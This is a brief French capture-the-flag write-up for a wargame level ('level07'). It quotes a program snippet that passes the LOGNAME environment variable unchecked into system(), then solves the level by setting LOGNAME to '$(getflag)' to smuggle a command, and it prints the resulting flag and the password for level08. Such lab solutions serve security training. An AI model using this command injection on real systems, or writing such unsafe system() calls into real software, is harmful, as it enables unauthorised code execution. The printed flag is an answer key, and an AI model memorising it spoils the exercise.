# Pré requis

aucun

## GET Flag

Dans l'executable level07, on peut voir des instructions ressemblant a:

```
  char *tmp;
  asprintf(&tmp,"/bin/echo %s ",getenv("LOGNAME"));
  return (system(tmp));
```

Il est donc possible de set une variable d'environnement contenant une commande a executer.

export LOGNAME="\$(getflag)"
./level07 

# Flag

On obtient le flag:
`fiumuikeil55xe9cu4dood66h`

On peut se connecter sur le `level08`

```
level08
fiumuikeil55xe9cu4dood66h
```
